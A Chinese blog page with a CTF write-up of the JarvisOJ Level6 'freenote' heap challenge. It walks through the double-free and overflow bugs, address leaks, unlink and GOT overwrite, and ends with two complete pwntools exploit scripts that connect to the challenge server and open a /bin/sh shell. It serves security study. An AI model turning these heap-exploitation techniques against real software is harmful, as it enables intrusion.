@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>堆入门-JarvisOJ-Level6 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期四, 五月 9日 2019, 6:33 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2.7k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      13 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前看过一点点堆的资料……然后就被劝退了，最近又硬着头皮捡起来看，打算用这道题来入门堆，调了两天，装了个 pwndbg ，看堆舒服了很多，最后总算是搞懂了，写篇文章总结一下。</p>
+<a id="more"></a>
+<hr>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先是保护机制：</p>
+<pre><code class="shell">[*] &#39;/home/aluvion/\xe6\xa1\x8c\xe9\x9d\xa2/freenote_x64&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>没有开 PIE，且 GOT 表可写。</p>
+<p>IDA 反编译看代码，看到代码逻辑：</p>
+<ul>
+<li>先申请一个 0x1810 大小的堆作为索引表，然后将最大堆数 256 放进堆里</li>
+<li>new note，将1（表示该堆已分配）、堆大小、堆地址放入索引表中，堆的大小是 0x80 的倍数</li>
+<li>list note，按照索引表中的地址读取堆内容</li>
+<li>edit note，按照索引表中的地址修改堆内容</li>
+<li>delete note，按照索引表中的地址 free 堆</li>
+</ul>
+<p>可以看到读入 note 内容的时候没有加上 \x00，利用 list note 功能可以泄露地址：</p>
+<pre><code class="c">for ( i = 0; (signed int)i &lt; (signed int)a2; i += v4 )
+{
+    v4 = read(0, (void *)(a1 + (signed int)i), (signed int)(a2 - i));
+    if ( v4 &lt;= 0 )
+        break;
+}
+</code></pre>
+<p>可以看到 delete_note 功能中存在漏洞，只要输入的 note 编号小于总数就可以 free，没有检查，存在 double free 和 UAF 漏洞，触发 unlink 就可以任意地址写：</p>
+<pre><code class="c">if ( v1 &gt;= 0 &amp;&amp; (signed __int64)v1 &lt; *(_QWORD *)qword_6020A8 )
+{
+    --*(_QWORD *)(qword_6020A8 + 8);
+    *(_QWORD *)(qword_6020A8 + 24LL * v1 + 16) = 0LL;
+    *(_QWORD *)(qword_6020A8 + 24LL * v1 + 24) = 0LL;
+    free(*(void **)(qword_6020A8 + 24LL * v1 + 32));
+    result = puts(&quot;Done.&quot;);
+}
+</code></pre>
+<p>可以看到 edit_note 功能中，对输入长度没有做检验，可以溢出覆盖：</p>
+<pre><code class="c">if ( v3 != *(_QWORD *)(qword_6020A8 + 24LL * v4 + 24) )
+{
+       v1 = (unsigned int)((signed int)(128 - (((((unsigned int)((unsigned __int64)v3 &gt;&gt; 32) &gt;&gt; 25) + (_BYTE)v3) &amp; 0x7F) - ((unsigned int)((unsigned __int64)v3 &gt;&gt; 32) &gt;&gt; 25))) &gt;&gt; 31) &gt;&gt; 25;
+    v2 = qword_6020A8;
+    *(_QWORD *)(v2 + 24LL * v4 + 32) = realloc(*(void **)(qword_6020A8 + 24LL * v4 + 32), (signed int)((((_BYTE)v1 + -128 - (char)v3 % -128) &amp; 0x7F) - v1 + v3));
+    *(_QWORD *)(qword_6020A8 + 24LL * v4 + 24) = v3;
+}
+printf(&quot;Enter your note: &quot;);
+write_note_content(*(_QWORD *)(qword_6020A8 + 24LL * v4 + 32), v3);
+result = puts(&quot;Done.&quot;);
+</code></pre>
+<p>那思路就很明确了：利用 list note 泄露地址，堆溢出伪造，然后通过触发 unlink 劫持 GOT 表，将某个函数地址改写为 system 来 getshell。</p>
+<h3 id="EXP-编写"><a href="#EXP-编写" class="headerlink" title="EXP 编写"></a>EXP 编写</h3><h4 id="泄露-heap-基地址-泄露-libc-基地址"><a href="#泄露-heap-基地址-泄露-libc-基地址" class="headerlink" title="泄露 heap 基地址 / 泄露 libc 基地址"></a>泄露 heap 基地址 / 泄露 libc 基地址</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>free 掉两个不连续的 chunk 之后，它们会被放入 unsorted bin 中，跟 unsorted bin 的地址通过 fd 和 bk 指针构成一个双向链表，比如我 free 了编号 1 和 3 的两个堆：</p>
+<pre><code class="c">unsortedbin
+all: 0x1cfa8b0 —▸ 0x1cfa9d0 —▸ 0x7f93c61a1b78 (main_arena+88) ◂— 0x1cfa8b0
+</code></pre>
+<p>由此我们有两种方案可以将地址泄露出来：</p>
+<ul>
+<li><p>从前一个堆进行溢出，覆盖掉被 free 堆的 head，这是 chunk0 和 chunk1 的数据，可以看到 chunk1 被 free 之后有了 fd 和 bk 两个指针（0xf2b8c0）：</p>
+<pre><code class="c">pwndbg&gt; x/40xg 0xf2b820
+0xf2b820:    0x0000000000000000    0x0000000000000091
+0xf2b830:    0x6161616161616161    0x6161616161616161
+0xf2b840:    0x6161616161616161    0x6161616161616161
+0xf2b850:    0x6161616161616161    0x6161616161616161
+0xf2b860:    0x6161616161616161    0x6161616161616161
+0xf2b870:    0x6161616161616161    0x6161616161616161
+0xf2b880:    0x6161616161616161    0x6161616161616161
+0xf2b890:    0x6161616161616161    0x6161616161616161
+0xf2b8a0:    0x6161616161616161    0x6161616161616161
+0xf2b8b0:    0x0000000000000000    0x0000000000000091
+0xf2b8c0:    0x0000000000f2b9d0    0x00007fe399d8eb78
+0xf2b8d0:    0x6262626262626262    0x6262626262626262
+0xf2b8e0:    0x6262626262626262    0x6262626262626262
+0xf2b8f0:    0x6262626262626262    0x6262626262626262
+0xf2b900:    0x6262626262626262    0x6262626262626262
+0xf2b910:    0x6262626262626262    0x6262626262626262
+0xf2b920:    0x6262626262626262    0x6262626262626262
+0xf2b930:    0x6262626262626262    0x6262626262626262
+</code></pre>
+<p>chunk0 溢出覆盖 0xf2b8b0 地址处的 chunk1 的 head（0xf2b8b0），即可通过 list note 泄露处 0xf2b8c0 处的地址（chunk3地址和main_arena+88，即unsorted bin这个”chunk”的”head”）。</p>
+</li>
+<li><p>原理同上，申请一个同样大小的新堆，如果内容长度不足这两个指针不会被覆盖，我们可以只覆盖 fd，泄露 bk。</p>
+</li>
+</ul>
+<h5 id="libc-基地址计算"><a href="#libc-基地址计算" class="headerlink" title="libc 基地址计算"></a>libc 基地址计算</h5><pre><code class="c">0x7fe399d8eb10 &lt;__malloc_hook&gt;:    0x0000000000000000    0x0000000000000000
+0x7fe399d8eb20 &lt;main_arena&gt;:    0x0000000100000000    0x0000000000000000
+</code></pre>
+<pre><code class="c">libc_base = 泄露出来的(main_arena + 88)的地址 - libc.symbols[&quot;__malloc_hook&quot;] - 88 - 0x10或者0x20
+</code></pre>
+<p>具体是 0x10 还是 0x20 就很玄学，比如这题我本地是 0x10，远程是 0x20。或者也可以在 unlink 之后利用任意地址写进行泄露。</p>
+<h5 id="heap-基地址计算"><a href="#heap-基地址计算" class="headerlink" title="heap 基地址计算"></a>heap 基地址计算</h5><pre><code class="c">heap_base = 泄露出来的chunk3的地址 - 0x1810(一开始申请的大堆的大小) - 0x10(大堆的head) - 0x90(小堆的大小) * 3(chunk3之前的chunk的数量)
+</code></pre>
+<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>我在 free 了 chunk0 之后，如果我再 free chunk1，就会触发向前合并，chunk0 就会被 unlink。而 unlink 操作中有一个这样子的操作：</p>
+<pre><code class="c">FD = P -&gt; fd                                                       
+BK = P -&gt; bk
+FD -&gt; bk = BK
+BK -&gt; fd = FD
+</code></pre>
+<p>通过这个操作，我们可以改写指向 chunk0 的指针 p（即索引表中的指针）指向 p - 3 的地址，然后我们利用 edit note 功能对 p 进行修改，即可实现任意地址写。</p>
+<p>还会进行检查：</p>
+<pre><code class="c">P -&gt; fd -&gt; bk == P
+P -&gt; bk -&gt; fd == P
+P -&gt; fd_nextsize -&gt; bk_nextsize == P
+P -&gt; bk_nextsize -&gt; fd_nextsize == P
+</code></pre>
+<p>所以我们堆溢出伪造的时候需要加以注意。</p>
+<h5 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h5><p>泄露地址之后的 chunk0 和 chunk1 长这样：</p>
+<pre><code class="c">0x730820:    0x0000000000000000    0x0000000000000121
+0x730830:    0x6161616161616161    0x6161616161616161
+0x730840:    0x6161616161616161    0x6161616161616161
+0x730850:    0x6161616161616161    0x6161616161616161
+0x730860:    0x6161616161616161    0x6161616161616161
+0x730870:    0x6161616161616161    0x6161616161616161
+0x730880:    0x6161616161616161    0x6161616161616161
+0x730890:    0x6161616161616161    0x6161616161616161
+0x7308a0:    0x6161616161616161    0x6161616161616161
+0x7308b0:    0x6565656565656565    0x6565656565656565
+0x7308c0:    0x6565656565656565    0x00007f43ad461b78
+0x7308d0:    0x6262626262626262    0x6262626262626262
+0x7308e0:    0x6262626262626262    0x6262626262626262
+0x7308f0:    0x6262626262626262    0x6262626262626262
+0x730900:    0x6262626262626262    0x6262626262626262
+0x730910:    0x6262626262626262    0x6262626262626262
+0x730920:    0x6262626262626262    0x6262626262626262
+0x730930:    0x6262626262626262    0x6262626262626262
+</code></pre>
+<p>我们通过溢出伪造 chunk0 和 chunk1：</p>
+<pre><code class="c">0x83a820:    0x0000000000000000    0x0000000000000121
+0x83a830:    0x0000000000000000    0x0000000000000080
+0x83a840:    0x0000000000839018    0x0000000000839020
+0x83a850:    0x6161616161616161    0x6161616161616161
+0x83a860:    0x6161616161616161    0x6161616161616161
+0x83a870:    0x6161616161616161    0x6161616161616161
+0x83a880:    0x6161616161616161    0x6161616161616161
+0x83a890:    0x6161616161616161    0x6161616161616161
+0x83a8a0:    0x6161616161616161    0x6161616161616161
+0x83a8b0:    0x0000000000000080    0x0000000000000090
+0x83a8c0:    0x7070707070707070    0x7070707070707070
+0x83a8d0:    0x7070707070707070    0x7070707070707070
+0x83a8e0:    0x7070707070707070    0x7070707070707070
+0x83a8f0:    0x7070707070707070    0x7070707070707070
+0x83a900:    0x7070707070707070    0x7070707070707070
+0x83a910:    0x7070707070707070    0x7070707070707070
+0x83a920:    0x7070707070707070    0x7070707070707070
+0x83a930:    0x6262626262626262    0x6262626262626262
+</code></pre>
+<p>此时我们有一个指向 chunk0 的指针位于 0x839030（从0x839020开始，每三个数据代表一个chunk，即是否被分配、大小和地址）：</p>
+<pre><code class="c">0x839000:    0x0000000000000000    0x0000000000001821
+0x839010:    0x0000000000000100    0x0000000000000003
+0x839020:    0x0000000000000001    0x0000000000000100
+0x839030:    0x000000000083a830    0x0000000000000000
+0x839040:    0x0000000000000000    0x000000000083a8c0
+</code></pre>
+<p>显然 unlink 的检查可以绕过，并且在 unlink 之后我们可以覆盖指向 chunk0 的指针为 p - 3：</p>
+<pre><code class="c">0x839000:    0x0000000000000000    0x0000000000001821
+0x839010:    0x0000000000000100    0x0000000000000002
+0x839020:    0x0000000000000001    0x0000000000000100
+0x839030:    0x0000000000839018    0x0000000000000000
+0x839040:    0x0000000000000000    0x000000000083a8c0
+</code></pre>
+<p>之后我们对 note 0 进行 edit 的时候，即可修改 0x0000000000839018 地址之后的数据，修改的时候注意哪里的数据需要修改，哪里的不需要修改。</p>
+<h4 id="泄露-libc-基地址"><a href="#泄露-libc-基地址" class="headerlink" title="泄露 libc 基地址"></a>泄露 libc 基地址</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>利用 edit note 功能对 p 进行修改的时候，可以改写其中一个 chunk 的地址为想要泄露的地址，比如 elf.got[“atoi”]，然后利用 list note 功能即可进行泄露。</p>
+<h5 id="栗子-1"><a href="#栗子-1" class="headerlink" title="栗子"></a>栗子</h5><pre><code class="c">0x839000:    0x0000000000000000    0x0000000000001821
+0x839010:    0x0000000000000100    0x0000000000000002
+0x839020:    0x0000000000000001    0x0000000000000100
+0x839030:    0x0000000000839018    0x0000000000000000
+0x839040:    0x0000000000000000    0x000000000083a8c0
+</code></pre>
+<p>将 0x839040 处的地址修改为 elf.got[“atoi”]，在 list 的时候即可打印 atoi 函数的地址。</p>
+<h4 id="劫持-GOT-表"><a href="#劫持-GOT-表" class="headerlink" title="劫持 GOT 表"></a>劫持 GOT 表</h4><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><p>利用 edit note 功能对 p 进行修改的时候，可以改写其中一个 chunk 的地址为想要覆盖的地址，比如 elf.got[“atoi”]，然后利用 edit note 功能即可进行修改。</p>
+<h5 id="栗子-2"><a href="#栗子-2" class="headerlink" title="栗子"></a>栗子</h5><pre><code class="c">0x839000:    0x0000000000000000    0x0000000000001821
+0x839010:    0x0000000000000100    0x0000000000000002
+0x839020:    0x0000000000000001    0x0000000000000100
+0x839030:    0x0000000000839018    0x0000000000000000
+0x839040:    0x0000000000000000    0x000000000083a8c0
+</code></pre>
+<p>将 0x839040 处的地址修改为 elf.got[“atoi”]，在 edit note1 的时候即可覆盖 atoi 函数的地址。</p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>在编写 exp 的时候还有很多细节需要注意：</p>
+<ul>
+<li>new 5个 chunk，防止 free chunk3 的时候向top chunk合并。</li>
+<li>发送 note 内容的时候不要 sendline，换行符会被分开当成下一次输入时的 choice，影响 recvuntil 获取地址。</li>
+<li>unlink 覆盖 p 之后，edit 的时候要注意长度要跟上次一样，不然会进入判断调用 realloc 导致程序崩溃。（payload.ljust(0x100, ‘p’)）</li>
+<li>要 edit 的 chunk 在索引表中要表示为已分配。</li>
+</ul>
+<p>不知道为什么这么写的也可以自行调试一下。</p>
+<pre><code class="python">from pwn import *
+
+context.log_level = &quot;debug&quot;
+local = 0
+
+elf = ELF(&quot;../../freenote_x64&quot;)
+
+if local:
+    libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)
+    target = process(&quot;../../freenote_x64&quot;)
+    gdb.attach(proc.pidof(target)[0]) 
+else:
+    libc = ELF(&quot;../../libc-2.19.so&quot;)
+    target = remote(&quot;pwn2.jarvisoj.com&quot;, 9886)
+
+malloc_hook_libc = libc.symbols[&quot;__malloc_hook&quot;]
+system_libc = libc.symbols[&quot;system&quot;]
+
+
+def list():
+    target.sendlineafter(&#39;choice: &#39;,&#39;1&#39;)
+
+
+def new(payload):
+    target.sendlineafter(&#39;choice: &#39;,&#39;2&#39;)
+    target.sendlineafter(&#39;new note: &#39;,str(len(payload)))
+    target.sendafter(&#39;note: &#39;,payload)
+
+
+def edit(num,payload):
+    target.sendlineafter(&#39;choice: &#39;,&#39;3&#39;)
+    target.sendlineafter(&#39;number: &#39;,str(num))
+    target.sendlineafter(&#39;note: &#39;,str(len(payload)))
+    target.sendafter(&#39;your note: &#39;,payload)
+
+
+def delete(num):
+    target.sendlineafter(&#39;choice: &#39;,&#39;4&#39;)
+    target.sendlineafter(&#39;number: &#39;,str(num))
+
+
+new(&#39;a&#39; * 0x80)
+new(&#39;b&#39; * 0x80)
+new(&#39;c&#39; * 0x80)
+new(&#39;d&#39; * 0x80)
+new(&#39;e&#39; * 0x80)
+
+delete(3)
+delete(1)
+
+log.progress(&#39;leak heap address&#39;)
+edit(0,&#39;a&#39; * 0x80 + &#39;e&#39; * 0x10)
+list()
+target.recvuntil(&quot;e&quot; * 0x10)
+heap_base = u64(target.recvuntil(&quot;\n&quot;, drop=True).ljust(0x8, &#39;\x00&#39;)) - 0x1810 - 0x10 - 0x90 * 3
+success(&quot;leak heap address OK&quot;)
+
+log.progress(&#39;leak libc address&#39;)
+edit(0,&#39;a&#39; * 0x80 + &#39;e&#39; * 0x18)
+list()
+target.recvuntil(&quot;e&quot; * 0x18)
+libc_base = u64(target.recvuntil(&quot;\n&quot;, drop=True).ljust(0x8, &#39;\x00&#39;)) - malloc_hook_libc - 0x20 - 88
+success(&quot;leak libc address OK&quot;)
+
+log.progress(&#39;unlink&#39;)
+payload = p64(0) + p64(0x80) + p64(heap_base + 0x30 - 0x18) + p64(heap_base + 0x30 - 0x10) + &#39;a&#39; * (0x80 - 4 * 8) + p64(0x80) + p64(0x90)
+payload = payload.ljust(0x100, &#39;p&#39;)
+edit(0, payload)
+delete(1)
+success(&quot;unlink OK&quot;)
+
+payload = p64(2) + p64(1) + p64(0x80) + p64(heap_base + 0x30) + p64(1) + p64(8) + p64(elf.got[&quot;atoi&quot;])
+payload = payload.ljust(0x100, &#39;p&#39;)
+edit(0, payload)
+#list()
+#target.recvuntil(&#39;1. &#39;)
+#libc_base2 = u64(target.recvuntil(&quot;\n&quot;,drop=True).ljust(0x8,&#39;\x00&#39;)) - libc.symbols[&#39;atoi&#39;]
+
+edit(1, p64(libc_base + system_libc))
+
+success(&#39;heapbase: &#39; + hex(heap_base))
+success(&#39;libcbase: &#39; + hex(libc_base))
+#success(&#39;libcbase2: &#39; + hex(libc_base2))
+
+target.sendlineafter(&#39;choice: &#39;,&#39;/bin/sh\x00&#39;)
+
+target.interactive()
+target.close()
+</code></pre>
+<hr>
+<h3 id="level6-x86"><a href="#level6-x86" class="headerlink" title="level6_x86"></a>level6_x86</h3><p>趁热打铁，今天做一做 32 位版本的题目加固一下，逻辑上没有太大变化，不过好像没有 atoi 函数，所以这次劫持的是 free 函数，将 /bin/sh 的字符串写入 note1 中，然后在改写索引表的时候注意不要修改了 note1 的地址，然后就是将 64 位的偏移修改一下就可以了：</p>
+<pre><code class="python">from pwn import *
+
+context.log_level = &quot;debug&quot;
+local = 0
+
+elf = ELF(&quot;../../freenote_x86&quot;)
+
+if local:
+    libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)
+    target = process(&quot;../../freenote_x86&quot;)
+    gdb.attach(proc.pidof(target)[0]) 
+else:
+    libc = ELF(&quot;../../libc-2.19.so&quot;)
+    target = remote(&quot;pwn2.jarvisoj.com&quot;, 9885)
+
+memalign_hook_libc = libc.symbols[&quot;__memalign_hook&quot;]
+system_libc = libc.symbols[&quot;system&quot;]
+
+
+def list():
+    target.sendlineafter(&#39;choice: &#39;, &#39;1&#39;)
+
+
+def new(payload):
+    target.sendlineafter(&#39;choice: &#39;, &#39;2&#39;)
+    target.sendlineafter(&#39;new note: &#39;, str(len(payload)))
+    target.sendafter(&#39;note: &#39;, payload)
+
+
+def edit(num,payload):
+    target.sendlineafter(&#39;choice: &#39;, &#39;3&#39;)
+    target.sendlineafter(&#39;number: &#39;, str(num))
+    target.sendlineafter(&#39;note: &#39;, str(len(payload)))
+    target.sendafter(&#39;your note: &#39;, payload)
+
+
+def delete(num):
+    target.sendlineafter(&#39;choice: &#39;, &#39;4&#39;)
+    target.sendlineafter(&#39;number: &#39;, str(num))
+
+
+new(&#39;a&#39; * 0x80)
+new(&#39;b&#39; * 0x80)
+new(&#39;c&#39; * 0x80)
+new(&#39;d&#39; * 0x80)
+new(&#39;e&#39; * 0x80)
+
+delete(3)
+delete(1)
+
+log.progress(&#39;leak address&#39;)
+edit(0, &quot;a&quot; * 0x80 + &quot;e&quot; * 0x8)
+list()
+target.recvuntil(&quot;e&quot; * 0x08)
+heap_base = u32(target.recv(4)) - 0xC10 - 0x08 - 0x88 * 3
+libc_base = u32(target.recv(4)) - 48 - 0x20 - memalign_hook_libc
+success(&quot;leak OK&quot;)
+success(&quot;heap base: %s&quot; % hex(heap_base))
+success(&quot;libc base: %s&quot; % hex(libc_base))
+
+log.progress(&#39;unlink&#39;)
+payload = p32(0) + p32(0x81) + p32(heap_base + 0x08 + 0x04 * 1) + p32(heap_base + 0x08 + 0x04 * 2)
+payload += &#39;a&#39; * (0x80 - 4 * 0x4) + p32(0x80) + p32(0x88) + &quot;/bin/sh\x00&quot;
+payload = payload.ljust(0x90, &quot;p&quot;)
+edit(0, payload)
+delete(1)
+success(&quot;unlink OK&quot;)
+
+payload = p32(2) + p32(1) + p32(0x4) + p32(elf.got[&quot;free&quot;])
+payload += p32(1) + p32(0x4) + p32(heap_base + 0x08 + 0xc10 + 0x88 * 1 + 0x08)
+payload = payload.ljust(0x90, &quot;p&quot;)
+edit(0, payload)
+edit(0, p32(libc_base + system_libc))
+
+delete(1)
+
+target.interactive()
+target.close()
+</code></pre>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://blog.csdn.net/qq_38204481/article/details/82808011" target="_blank" rel="noopener">https://blog.csdn.net/qq_38204481/article/details/82808011</a></p>
+<p><a href="https://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xJDchen/p/6195919.html</a></p>
+<p><a href="https://www.360zhijia.com/anquan/427474.html" target="_blank" rel="noopener">https://www.360zhijia.com/anquan/427474.html</a></p>
+<p><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5486458.html</a></p>
+<p><a href="https://www.cnblogs.com/alisecurity/p/5520847.html" target="_blank" rel="noopener">https://www.cnblogs.com/alisecurity/p/5520847.html</a></p>
+<p><a href="http://www.cnblogs.com/snip3r/p/9962960.html" target="_blank" rel="noopener">http://www.cnblogs.com/snip3r/p/9962960.html</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Pwn/">Pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/05/14/HCTF2016-fheap学习/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>HCTF2016-fheap学习</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/05/09/虚拟机环境搭建/">
+                        <span>虚拟机环境搭建</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
